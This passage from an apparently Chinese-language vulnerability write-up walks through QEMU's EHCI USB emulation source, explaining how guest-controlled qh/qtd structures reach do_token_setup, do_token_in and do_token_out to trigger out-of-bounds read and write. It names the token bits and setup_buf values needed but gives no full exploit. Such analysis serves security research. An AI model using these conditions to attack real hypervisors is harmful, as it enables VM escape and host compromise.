QH_EPCHAR_EPS_SH              12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EHCI_QH_EPS_FULL              0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EHCI_QH_EPS_LOW               1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EHCI_QH_EPS_HIGH              2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EHCI_QH_EPS_RESERVED          3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_EP_MASK             0x00000f00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_EP_SH               8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_I                   (1 &lt;&lt; 7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_DEVADDR_MASK        0x0000007f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_DEVADDR_SH          0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint capabilities */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> epcap;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_MULT_MASK            0xc0000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_MULT_SH              30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_PORTNUM_MASK         0x3f800000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_PORTNUM_SH           23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_HUBADDR_MASK         0x007f0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_HUBADDR_SH           16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_CMASK_MASK           0x0000ff00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_CMASK_SH             8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_SMASK_MASK           0x000000ff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCAP_SMASK_SH             0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> current_qtd;             <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next_qtd;                <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext_qtd;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_ALTNEXT_NAKCNT_MASK        0x0000001e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_ALTNEXT_NAKCNT_SH          1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> token;                   <span class="comment">/* Same as QTD token */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFPTR_CPROGMASK_MASK         0x000000ff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFPTR_FRAMETAG_MASK          0x0000001f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFPTR_SBYTES_MASK            0x00000fe0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFPTR_SBYTES_SH              5</span></span><br><span class="line">&#125; EHCIqh;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> EHCIQueue *<span class="title">ehci_state_fetchqh</span><span class="params">(EHCIState *ehci, <span class="keyword">int</span> async)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q-&gt;dev = ehci_find_device(q-&gt;ehci,get_field(q-&gt;qh.epchar, QH_EPCHAR_DEVADDR));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//................................................................</span></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;qh.token &amp; QTD_TOKEN_HALT) &#123;</span><br><span class="line">        ehci_set_state(ehci, async, EST_HORIZONTALQH);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((q-&gt;qh.token &amp; QTD_TOKEN_ACTIVE) &amp;&amp;</span><br><span class="line">               (NLPTR_TBIT(q-&gt;qh.current_qtd) == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">               (q-&gt;qh.current_qtd != <span class="number">0</span>)) &#123;</span><br><span class="line">        q-&gt;qtdaddr = q-&gt;qh.current_qtd;</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHQTD);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*  EHCI spec version 1.0 Section 4.10.2 */</span></span><br><span class="line">        ehci_set_state(ehci, async, EST_ADVANCEQUEUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> USBDevice *<span class="title">ehci_find_device</span><span class="params">(EHCIState *ehci, <span class="keyword">uint8_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NB_PORTS; i++) &#123;</span><br><span class="line">        port = &amp;ehci-&gt;ports[i];</span><br><span class="line">        <span class="keyword">if</span> (!(ehci-&gt;portsc[i] &amp; PORTSC_PED)) &#123;</span><br><span class="line">            DPRINTF(<span class="string">"Port %d not enabled\n"</span>, i);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dev = usb_find_device(port, addr);</span><br><span class="line">        <span class="keyword">if</span> (dev != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dev;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORTSC_PED           (1 &lt;&lt; 2)     <span class="comment">// Port Enable/Disable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORTSC_PRESET        (1 &lt;&lt; 8)     <span class="comment">// Port Reset</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_port_write</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">int</span> port = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> *portsc = &amp;s-&gt;portsc[port];</span><br><span class="line">    <span class="keyword">uint32_t</span> old = *portsc;</span><br><span class="line">    USBDevice *dev = s-&gt;ports[port].dev;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_portsc_write(addr + s-&gt;portscbase, addr &gt;&gt; <span class="number">2</span>, val);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clear rwc bits */</span></span><br><span class="line">    *portsc &amp;= ~(val &amp; PORTSC_RWC_MASK);</span><br><span class="line">    <span class="comment">/* The guest may clear, but not set the PED bit */</span></span><br><span class="line">    *portsc &amp;= val | ~PORTSC_PED;</span><br><span class="line">    <span class="comment">/* POWNER is masked out by RO_MASK as it is RO when we've no companion */</span></span><br><span class="line">    handle_port_owner_write(s, port, val);</span><br><span class="line">    <span class="comment">/* And finally apply RO_MASK */</span></span><br><span class="line">    val &amp;= PORTSC_RO_MASK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((val &amp; PORTSC_PRESET) &amp;&amp; !(*portsc &amp; PORTSC_PRESET)) &#123;</span><br><span class="line">        trace_usb_ehci_port_reset(port, <span class="number">1</span>);         <span class="comment">//这里设置以重置端口</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(val &amp; PORTSC_PRESET) &amp;&amp;(*portsc &amp; PORTSC_PRESET)) &#123;</span><br><span class="line">        trace_usb_ehci_port_reset(port, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (dev &amp;&amp; dev-&gt;attached) &#123;</span><br><span class="line">            usb_port_reset(&amp;s-&gt;ports[port]);</span><br><span class="line">            *portsc &amp;= ~PORTSC_CSC;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *  Table 2.16 Set the enable bit(and enable bit change) to indicate</span></span><br><span class="line"><span class="comment">         *  to SW that this port has a high speed device attached</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (dev &amp;&amp; dev-&gt;attached &amp;&amp; (dev-&gt;speedmask &amp; USB_SPEED_MASK_HIGH)) &#123;</span><br><span class="line">            val |= PORTSC_PED;                      <span class="comment">//这里设置以enable端口以绕过前面的检查</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((val &amp; PORTSC_SUSPEND) &amp;&amp; !(*portsc &amp; PORTSC_SUSPEND)) &#123;</span><br><span class="line">        trace_usb_ehci_port_suspend(port);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(val &amp; PORTSC_FPRES) &amp;&amp; (*portsc &amp; PORTSC_FPRES)) &#123;</span><br><span class="line">        trace_usb_ehci_port_resume(port);</span><br><span class="line">        val &amp;= ~PORTSC_SUSPEND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *portsc &amp;= ~PORTSC_RO_MASK;</span><br><span class="line">    *portsc |= val;</span><br><span class="line">    trace_usb_ehci_portsc_change(addr + s-&gt;portscbase, addr &gt;&gt; <span class="number">2</span>, *portsc, old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续往下看<code>EST_FETCHQTD</code>这个分支，会调用<code>ehci_state_fetchqtd</code>函数，qtd的地址是根据<code>qh.current_qtd</code>决定的，由于我们可以控制qh因此可以控制qtd。这里只需要设置<code>qtd.token &amp; QTD_TOKEN_ACTIVE(1&lt;&lt;7)</code>即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*  EHCI spec version 1.0 Section 3.5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext;                 <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> token;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_DTOGGLE             (1 &lt;&lt; 31)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_TBYTES_MASK         0x7fff0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_TBYTES_SH           16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_IOC                 (1 &lt;&lt; 15)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_CPAGE_MASK          0x00007000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_CPAGE_SH            12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_CERR_MASK           0x00000c00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_CERR_SH             10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_PID_MASK            0x00000300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_PID_SH              8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_ACTIVE              (1 &lt;&lt; 7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_HALT                (1 &lt;&lt; 6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_DBERR               (1 &lt;&lt; 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_BABBLE              (1 &lt;&lt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_XACTERR             (1 &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_MISSEDUF            (1 &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_SPLITXSTATE         (1 &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_PING                (1 &lt;&lt; 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_BUFPTR_MASK               0xfffff000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_BUFPTR_SH                 12</span></span><br><span class="line">&#125; EHCIqtd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Section 4.10.2 - paragraph 4 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ehci_state_fetchqtd</span><span class="params">(EHCIQueue *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//..............</span></span><br><span class="line">    <span class="keyword">if</span> (!(qtd.token &amp; QTD_TOKEN_ACTIVE)) &#123;</span><br><span class="line">        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (p-&gt;async) &#123;</span><br><span class="line">        <span class="keyword">case</span> EHCI_ASYNC_NONE:</span><br><span class="line">        <span class="keyword">case</span> EHCI_ASYNC_INITIALIZED:</span><br><span class="line">            <span class="comment">/* Not yet executed (MULT), or previously nacked (int) packet */</span></span><br><span class="line">            ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EHCI_ASYNC_INFLIGHT:</span><br><span class="line">            <span class="comment">/* Check if the guest has added new tds to the queue */</span></span><br><span class="line">            again = ehci_fill_queue(QTAILQ_LAST(&amp;q-&gt;packets));</span><br><span class="line">            <span class="comment">/* Unfinished async handled packet, go horizontal */</span></span><br><span class="line">            ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EHCI_ASYNC_FINISHED:</span><br><span class="line">            <span class="comment">/* Complete executing of the packet */</span></span><br><span class="line">            ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTING);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ehci_trace_guest_bug(q-&gt;ehci, <span class="string">"no device attached to queue"</span>);</span><br><span class="line">        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = ehci_alloc_packet(q);</span><br><span class="line">        p-&gt;qtdaddr = q-&gt;qtdaddr;</span><br><span class="line">        p-&gt;qtd = qtd;</span><br><span class="line">        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);<span class="comment">//这里</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>ehci_state_execute</code>函数，这里会直接进入<code>again = ehci_execute(p, &quot;process&quot;);</code>，进而直接进入<code>usb_handle_packet(p-&gt;queue-&gt;dev, &amp;p-&gt;packet);</code>再进入<code>usb_process_one(p)</code>，这里的pid是在<code>ehci_execute</code>函数中的<code>p-&gt;pid = ehci_get_pid(&amp;p-&gt;qtd);</code>获取的，由于我们可以控制qtd，因此可以控制调用任何一个分支函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usb_process_one</span><span class="params">(USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    USBDevice *dev = p-&gt;ep-&gt;dev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Handlers expect status to be initialized to USB_RET_SUCCESS, but it</span></span><br><span class="line"><span class="comment">     * can be USB_RET_NAK here from a previous usb_process_one() call,</span></span><br><span class="line"><span class="comment">     * or USB_RET_ASYNC from going through usb_queue_one().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    p-&gt;status = USB_RET_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;ep-&gt;nr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* control pipe */</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;parameter) &#123;</span><br><span class="line">            do_parameter(dev, p);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (p-&gt;pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">            do_token_setup(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">            do_token_in(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">            do_token_out(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            p-&gt;status = USB_RET_STALL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* data pipe */</span></span><br><span class="line">        usb_device_handle_data(dev, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ehci_get_pid</span><span class="params">(EHCIqtd *qtd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (get_field(qtd-&gt;token, QTD_TOKEN_PID)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_OUT;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_IN;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_SETUP;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"bad token\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* nifty macros from Arnon's EHCI version  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_field(data, field) \</span></span><br><span class="line">    (((data) &amp; field##_MASK) &gt;&gt; field##_SH)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_PID_MASK            0x00000300</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_PID_SH              8</span></span><br></pre></td></tr></table></figure>
<p>来看下漏洞函数函数<code>do_token_setup</code>，<code>p-&gt;iov.size</code>设置为8，它是由<code>qtd-&gt;token</code>决定的，setup_buf的地址是由qtd的bufptr确定的，因此长度可控(这块待确定)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_setup</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> request, value, index;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;iov.size != <span class="number">8</span>) &#123;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">    s-&gt;setup_index = <span class="number">0</span>;</span><br><span class="line">    p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_len &gt; <span class="keyword">sizeof</span>(s-&gt;data_buf)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                <span class="string">"usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n"</span>,</span><br><span class="line">                s-&gt;setup_len, <span class="keyword">sizeof</span>(s-&gt;data_buf));</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">        usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                  s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_SETUP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status != USB_RET_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;actual_length &lt; s-&gt;setup_len) &#123;</span><br><span class="line">            s-&gt;setup_len = p-&gt;actual_length;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_len == <span class="number">0</span>)</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;actual_length = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="越界读"><a href="#越界读" class="headerlink" title="越界读"></a>越界读</h3><p>根据<code>ehci_get_pid</code>，我们需要设置<code>(qtd-&gt;token &amp; 0x00000300) &gt;&gt; 8</code>，设置为<code>2&gt;&gt;8</code>。再使用<code>s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</code>设置setip_len。为了进入指定分支，我们需要提前设置<code>s-&gt;setup_state=SETUP_STATE_DATA</code>，要达到这个状态需要在<code>do_token_setup</code>函数中满足<code>s-&gt;setup_buf[0] &amp; 0x80(USB_DIR_IN)</code>。</p>
<p>设置<code>qtd-&gt;token &amp; (2 &gt;&gt; 8)</code>进入读函数，最后一个检查我们要提前设置<code>p-&gt;iov.size</code>，它的值由<code>qtd-&gt;token = size &lt;&lt; QTD_TOKEN_TBYTES_SH</code>控制(这一点是参考文章说的，自己源码中没找到emmmm)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USB_DIR_IN			0x80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_in</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> request, value, index;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                      s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            <span class="keyword">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="越界写"><a href="#越界写" class="headerlink" title="越界写"></a>越界写</h3><p>先进入do_token_setup函数设置越界长度以及setbuf[0] &amp;　USB_DIR_OUT(0))。设置<code>qtd-&gt;token = (0 &lt;&lt; 8)</code>进入到<code>do_token_out</code>，将qtd-&gt;bufptr[0]复制到s-&gt;data_buf。</p>
<p>还有一个存疑的地方是参考文章说</p>
<ul>
<li>这里需要注意的是经过几次调用后，s-&gt;setup_index &gt;= s-&gt;setup_len 会满足条件，s-&gt;setup_state 会被设置成 SETUP_STATE_ACK，可以通过调用一次do_token_setup，设置正常长度，将s-&gt;setup_state重新设置成SETUP_STATE_DATA。</li>
</ul>
<p>这部分等下动调看看</p>
